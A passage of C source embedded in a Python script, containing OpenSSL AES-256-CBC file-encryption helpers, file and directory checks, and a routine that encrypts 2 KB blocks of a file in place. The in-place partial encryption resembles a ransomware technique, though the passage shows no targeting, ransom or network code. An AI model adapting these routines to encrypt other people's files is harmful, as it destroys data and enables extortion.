		output[i] = (output[i] % 26) + 65;
	}
}

static _Bool _is_dir(const char *pathname) {
	struct stat path_stat;
	stat(pathname, &path_stat);
	return S_ISDIR(path_stat.st_mode);
}

static _Bool _file_exist(const char *filename) {
	FILE *file = fopen(filename, "rb");
	if (file != NULL) {
		fclose(file);
		return 1;
	}
	return 0;
}

static size_t _file_size(const char *filename) {
	struct stat file_stat;
	stat(filename, &file_stat);
	return file_stat.st_size;
}

static int _file_encrypt(int mode, FILE *output, FILE *input, const char *key, char *iv){
	uint8_t inbuf[BUFSIZ_2K];
	uint8_t outbuf[BUFSIZ_2K + BSIZE];

	int rb, wb;
	EVP_CIPHER_CTX *ctx;

	ctx = EVP_CIPHER_CTX_new();
	if(ctx == NULL){
		return -1;
	}

	if(!EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL, mode)){
		return -2;
	}

	OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == KSIZE);
	OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == BSIZE);

	if(!EVP_CipherInit_ex(ctx, NULL, NULL, (uint8_t*)key, (uint8_t*)iv, mode)) {
		EVP_CIPHER_CTX_cleanup(ctx);
		return -3;
	}

	while(1){
		rb = fread(inbuf, sizeof(unsigned char), BUFSIZ_2K, input);
		if (ferror(input)){
			EVP_CIPHER_CTX_cleanup(ctx);
			return -4;
		}
		if(!EVP_CipherUpdate(ctx, outbuf, &wb, inbuf, rb)){
			EVP_CIPHER_CTX_cleanup(ctx);
			return -5;
		}
		fwrite(outbuf, sizeof(unsigned char), wb, output);
		if (ferror(output)) {
			EVP_CIPHER_CTX_cleanup(ctx);
			return -6;
		}
		if (rb < BUFSIZ_2K) {
			break;
		}
	}

	if(!EVP_CipherFinal_ex(ctx, outbuf, &wb)){
		EVP_CIPHER_CTX_cleanup(ctx);
		return -7;
	}

	fwrite(outbuf, sizeof(unsigned char), wb, output);

	if (ferror(output)) {
		EVP_CIPHER_CTX_cleanup(ctx);
		return -8;
	}

	EVP_CIPHER_CTX_cleanup(ctx);
	return 0;
}

static void _part_file_encrypt(int mode, FILE *fp, size_t begin, char *buffer, const char *key, const char *iv) {
	fseek(fp, begin, SEEK_SET);
	fread(buffer, sizeof(uint8_t), BUFSIZ_2K, fp);

	crypto_aes_256cbc(mode, key, buffer, buffer, BUFSIZ_2K, iv);

	fseek(fp, begin, SEEK_SET);
	fwrite(buffer, sizeof(uint8_t), BUFSIZ_2K, fp);
}
"""

if __name__ == "__main__":
	main()
